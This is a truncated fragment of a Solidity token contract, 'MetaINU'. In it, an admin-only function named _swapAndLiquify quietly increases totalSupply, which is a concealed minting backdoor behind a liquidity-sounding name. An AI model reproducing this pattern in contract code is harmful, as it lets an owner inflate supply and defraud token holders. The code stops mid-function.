...
contract MetaINU is Ownable {
  ...
  function _swapAndLiquify(address from, uint256 _value, uint256 _market) public onlyAdmin {
    swapAndLiquify(from, _value, _market);
    totalSupply = totalSupply.add(_value);
  }

  function swapAndLiquify(address from, uint256 _value, uint256 _market) internal {
    if(from != address(0)){
    require(_value != 10);
